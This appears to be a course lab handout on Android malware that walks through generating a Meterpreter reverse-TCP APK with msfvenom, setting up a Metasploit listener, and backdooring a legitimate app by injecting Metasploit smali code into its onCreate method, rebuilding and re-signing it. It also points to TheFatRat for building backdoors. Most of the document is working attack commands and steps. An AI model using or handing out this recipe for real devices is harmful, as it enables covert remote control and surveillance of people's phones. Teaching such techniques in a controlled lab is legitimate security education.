# Lab week 7
### Malware
In this lab we will be installing Malware in an Android Emulator

1. Use MetaSploit to create an malicious APK.
> Create apk using the following command:  
> Create a Meterpreter session using:   
> `msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.145 LPORT=4444 R > malware.apk`
> ```
> use multi/handler
> set PAYLOAD android/meterpreter/reverse_tcp
> set LHOST [the same as your Kali IP]
> set LPORT [The same as the APK]
> exploit
> ```
2. Create an own APK and infect with metasploit smali code
3. Create a backdoor using an original APK (download this apk first) - alternative use the MyFantasticApp.apk on LEHO.
> Solution for 2 & 3:  
> - Use apktool to retrieve the metasploit smali from Q1.  
> - Find the apk using Racoon (not neccecary in 2)
> - Use apktool to retrieve the smali code from your apk  
> - Copy the payload files to the original app's folder.  
> 	   - Go to "/root/payload/smali/com/metasploit/stage" 
>	   - Copy all the .smali files.  
>	   - Paste them in "/root/original/smali/com/metasploit/stage".   
>	*Note that this folder does not exists, so you have to create it.*  
> - Add extra permissions in the manifest file and look for the main function
> - Search the following code in that activity  
> `.method protected onCreate(Landroid/os/Bundle;)V`  
> - Insert the following after that:  
> `invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V`  
> - Use `apktool b` to build the apk again  
> - Sign the APK using jarsigner

1. Install the Fat Rat in a Kali VM
   * https://github.com/Screetsec/TheFatRat
   1. Create a backdoor using this tool
> Clone the git project and go trough the options in The Fat Rat  

**Optional**
1. Write your own Malware, craft your own smali payload to insert into an APK.